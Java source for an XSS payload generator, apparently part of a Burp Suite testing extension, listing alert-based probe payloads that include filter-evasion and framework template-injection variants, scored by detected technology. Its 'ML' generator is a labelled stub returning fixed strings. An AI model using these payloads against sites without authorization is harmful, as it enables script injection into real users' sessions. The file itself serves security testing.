package com.secure.ai.burp.payloads.generators;

import burp.api.montoya.http.HttpRequestToBeSent;
import com.secure.ai.burp.ml.ModelManager;
import com.secure.ai.burp.ml.MLPrediction;
import com.secure.ai.burp.payloads.GeneratedPayload;
import com.secure.ai.burp.payloads.PayloadContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;

public class XSSPayloadGenerator implements PayloadGeneratorStrategy {
    private static final Logger logger = LoggerFactory.getLogger(XSSPayloadGenerator.class);
    
    private final ModelManager modelManager;
    private final AtomicInteger generatedCount = new AtomicInteger(0);
    
    // Base XSS payloads categorized by context
    private static final String[] BASIC_PAYLOADS = {
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "'-alert('xss')-'",
        "\"><script>alert('xss')</script>",
        "javascript:alert(String.fromCharCode(88,83,83))",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "<body onload=alert('xss')>",
        "<input autofocus onfocus=alert('xss')>"
    };
    
    private static final String[] ADVANCED_PAYLOADS = {
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>",
        "<img src=\"\" onerror=\"alert('xss')\"/>",
        "<svg><script>alert('xss')</script></svg>",
        "<math><mi//xlink:href=\"data:x,<script>alert('xss')</script>\">",
        "<details open ontoggle=\"alert('xss')\">",
        "<marquee onstart=\"alert('xss')\">",
        "<video><source onerror=\"alert('xss')\">",
        "<audio src=x onerror=alert('xss')>",
        "<keygen autofocus onfocus=alert('xss')>",
        "<embed src=\"javascript:alert('xss')\">"
    };
    
    private static final String[] FILTER_EVASION_PAYLOADS = {
        "<ScRiPt>alert('xss')</ScRiPt>",
        "<script>al\\u0065rt('xss')</script>",
        "<script>a\\x6cert('xss')</script>",
        "<IMG SRC=javascript:alert('xss')>",
        "<IMG SRC=JaVaScRiPt:alert('xss')>",
        "<IMG SRC=`javascript:alert('xss')`>",
        "<script>alert(/xss/)</script>",
        "<script>alert`xss`</script>",
        "<<SCRIPT>alert('xss');//<</SCRIPT>",
        "<IMG \"\"\"><SCRIPT>alert('xss')</SCRIPT>\">"
    };
    
    private static final String[] DOM_XSS_PAYLOADS = {
        "#<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        "<script>document.location='javascript:alert(String.fromCharCode(88,83,83))'</script>",
        "<script>setTimeout('alert(\"xss\")',1)</script>",
        "<script>document.write('<img src=x onerror=alert(String.fromCharCode(88,83,83))>')</script>",
        "<script>eval('al'+'ert(\"xss\")')</script>",
        "<script>Function('alert(\"xss\")')();</script>",
        "<script>[].constructor.constructor('alert(\"xss\")')();</script>",
        "<script>top['al'+'ert']('xss')</script>"
    };
    
    public XSSPayloadGenerator(ModelManager modelManager) {
        this.modelManager = modelManager;
    }
    
    @Override
    public List<GeneratedPayload> generatePayloads(HttpRequestToBeSent request, PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        try {
            // Generate context-aware XSS payloads
            payloads.addAll(generateBasicPayloads(context));
            payloads.addAll(generateAdvancedPayloads(context));
            payloads.addAll(generateFilterEvasionPayloads(context));
            payloads.addAll(generateDOMXSSPayloads(context));
            payloads.addAll(generateContextSpecificPayloads(context));
            payloads.addAll(generateMLGeneratedPayloads(context));
            
            // Remove duplicates and score payloads
            payloads = removeDuplicates(payloads);
            scorePayloads(payloads, context);
            
            generatedCount.addAndGet(payloads.size());
            
        } catch (Exception e) {
            logger.error("Error generating XSS payloads", e);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateBasicPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        for (String payload : BASIC_PAYLOADS) {
            GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "xss", context)
                    .generationMethod("basic")
                    .effectivenessScore(0.6)
                    .build();
            
            payloads.add(generatedPayload);
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateAdvancedPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        if (context.getApplicationContext().hasGoodSecurity()) {
            // Use advanced payloads for well-protected applications
            for (String payload : ADVANCED_PAYLOADS) {
                GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "xss", context)
                        .generationMethod("advanced")
                        .effectivenessScore(0.7)
                        .build();
                
                payloads.add(generatedPayload);
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateFilterEvasionPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        if (context.getApplicationContext().hasXSSProtection()) {
            // Use filter evasion techniques if XSS protection is detected
            for (String payload : FILTER_EVASION_PAYLOADS) {
                GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "xss", context)
                        .generationMethod("filter_evasion")
                        .effectivenessScore(0.8)
                        .requiresEncoding(true, "url")
                        .build();
                
                payloads.add(generatedPayload);
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateDOMXSSPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        if (context.getApplicationContext().hasTechnology("javascript") || 
            context.hasJsonContent()) {
            
            for (String payload : DOM_XSS_PAYLOADS) {
                GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "xss", context)
                        .generationMethod("dom_xss")
                        .effectivenessScore(0.75)
                        .targetLocation("url_fragment")
                        .build();
                
                payloads.add(generatedPayload);
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateContextSpecificPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        // Generate payloads based on specific application context
        if (context.getApplicationContext().hasTechnology("php")) {
            payloads.add(new GeneratedPayload.Builder(
                "<?php echo '<script>alert(\"xss\")</script>'; ?>", "xss", context)
                .generationMethod("php_context")
                .effectivenessScore(0.6)
                .build());
        }
        
        if (context.getApplicationContext().hasTechnology("asp.net")) {
            payloads.add(new GeneratedPayload.Builder(
                "<% Response.Write(\"<script>alert('xss')</script>\") %>", "xss", context)
                .generationMethod("asp_context")
                .effectivenessScore(0.6)
                .build());
        }
        
        if (context.hasJsonContent()) {
            payloads.add(new GeneratedPayload.Builder(
                "\"},\"xss\":\"<script>alert('xss')</script>", "xss", context)
                .generationMethod("json_context")
                .effectivenessScore(0.7)
                .build());
        }
        
        // Parameter-specific payloads
        for (String param : context.getReflectedParameters()) {
            if (param.toLowerCase().contains("search") || param.toLowerCase().contains("query")) {
                payloads.add(new GeneratedPayload.Builder(
                    "<script>alert('XSS_in_" + param + "')</script>", "xss", context)
                    .generationMethod("parameter_specific")
                    .targetParameter(param)
                    .effectivenessScore(0.8)
                    .build());
            }
        }
        
        return payloads;
    }
    
    private List<GeneratedPayload> generateMLGeneratedPayloads(PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        
        try {
            if (modelManager.isModelLoaded("xss_detection")) {
                // Use ML model to generate novel XSS payloads
                String[] mlGeneratedPayloads = generateMLPayloads(context);
                
                for (String payload : mlGeneratedPayloads) {
                    GeneratedPayload generatedPayload = new GeneratedPayload.Builder(payload, "xss", context)
                            .generationMethod("ml_generated")
                            .effectivenessScore(0.9)
                            .build();
                    
                    payloads.add(generatedPayload);
                }
            }
        } catch (Exception e) {
            logger.warn("Error generating ML-based XSS payloads", e);
        }
        
        return payloads;
    }
    
    private String[] generateMLPayloads(PayloadContext context) {
        // This would use the ML model to generate novel payloads
        // For now, return some advanced contextual payloads
        List<String> mlPayloads = new ArrayList<>();
        
        // Generate payloads based on application technology
        String tech = context.getApplicationContext().getDetectedTechnologies().iterator().hasNext() ?
                     context.getApplicationContext().getDetectedTechnologies().iterator().next() : "generic";
        
        switch (tech) {
            case "react":
                mlPayloads.add("'><script>React.createElement('script',{dangerouslySetInnerHTML:{__html:'alert(\"xss\")'}})</script>");
                break;
            case "angular":
                mlPayloads.add("{{constructor.constructor('alert(\"xss\")')()}}");
                break;
            case "vue":
                mlPayloads.add("'><script>Vue.compile('<script>alert(\"xss\")</script>');</script>");
                break;
            default:
                mlPayloads.add("<script>/*" + tech + "*/alert('xss_' + '" + tech + "')</script>");
        }
        
        return mlPayloads.toArray(new String[0]);
    }
    
    private void scorePayloads(List<GeneratedPayload> payloads, PayloadContext context) {
        for (GeneratedPayload payload : payloads) {
            double contextScore = calculateContextualScore(payload, context);
            payload.setContextRelevanceScore(contextScore);
            
            // Use ML model to score if available
            if (modelManager.isModelLoaded("xss_detection")) {
                try {
                    MLPrediction prediction = modelManager.predictText("xss_detection", payload.getPayload());
                    if (prediction != null) {
                        payload.setEffectivenessScore(prediction.getMaxPrediction());
                    }
                } catch (Exception e) {
                    logger.debug("ML scoring failed for payload, using fallback", e);
                }
            }
        }
    }
    
    private double calculateContextualScore(GeneratedPayload payload, PayloadContext context) {
        double score = 0.0;
        
        // Higher score for reflected parameters
        if (context.hasReflectedParameters() && payload.getTargetParameter() != null &&
            context.getReflectedParameters().contains(payload.getTargetParameter())) {
            score += 0.4;
        }
        
        // Higher score if no XSS protection
        if (!context.getApplicationContext().hasXSSProtection()) {
            score += 0.3;
        }
        
        // Technology-specific scoring
        String method = payload.getGenerationMethod();
        if (method.contains("php") && context.getApplicationContext().hasTechnology("php")) {
            score += 0.2;
        }
        if (method.contains("asp") && context.getApplicationContext().hasTechnology("asp.net")) {
            score += 0.2;
        }
        if (method.contains("json") && context.hasJsonContent()) {
            score += 0.2;
        }
        
        // Filter evasion gets higher score if filters are detected
        if (method.equals("filter_evasion") && context.getApplicationContext().hasXSSProtection()) {
            score += 0.3;
        }
        
        return Math.min(score, 1.0);
    }
    
    private List<GeneratedPayload> removeDuplicates(List<GeneratedPayload> payloads) {
        Set<String> seen = new HashSet<>();
        List<GeneratedPayload> unique = new ArrayList<>();
        
        for (GeneratedPayload payload : payloads) {
            String key = payload.getPayload() + "_" + payload.getGenerationMethod();
            if (seen.add(key)) {
                unique.add(payload);
            }
        }
        
        return unique;
    }
    
    @Override
    public GeneratedPayload customizePayload(String basePayload, PayloadContext context) {
        // Customize the payload based on context
        String customized = basePayload;
        
        // Add parameter-specific customization
        if (context.hasReflectedParameters() && !context.getReflectedParameters().isEmpty()) {
            String param = context.getReflectedParameters().iterator().next();
            customized = basePayload.replace("xss", "xss_in_" + param);
        }
        
        return new GeneratedPayload.Builder(customized, "xss", context)
                .generationMethod("customized")
                .effectivenessScore(0.7)
                .build();
    }
    
    @Override
    public String getVulnerabilityType() {
        return "xss";
    }
    
    @Override
    public int getGeneratedCount() {
        return generatedCount.get();
    }
    
    @Override
    public void updateLearning(GeneratedPayload payload, boolean wasSuccessful, double actualEffectiveness) {
        // Update internal learning mechanisms
        // This could update weights, successful payload patterns, etc.
        logger.debug("Updating XSS generator learning: method={}, successful={}, effectiveness={}", 
                    payload.getGenerationMethod(), wasSuccessful, actualEffectiveness);
    }
    
    @Override
    public double getContextualPriority(PayloadContext context) {
        double priority = 0.5; // Base priority
        
        if (context.hasReflectedParameters()) priority += 0.3;
        if (!context.getApplicationContext().hasXSSProtection()) priority += 0.2;
        if (context.hasFormInputs()) priority += 0.2;
        
        return Math.min(priority, 1.0);
    }
    
    @Override
    public boolean isApplicable(PayloadContext context) {
        // XSS is generally applicable to most web applications
        return context.hasReflectedParameters() || 
               context.hasFormInputs() || 
               context.hasHttpParameters();
    }
}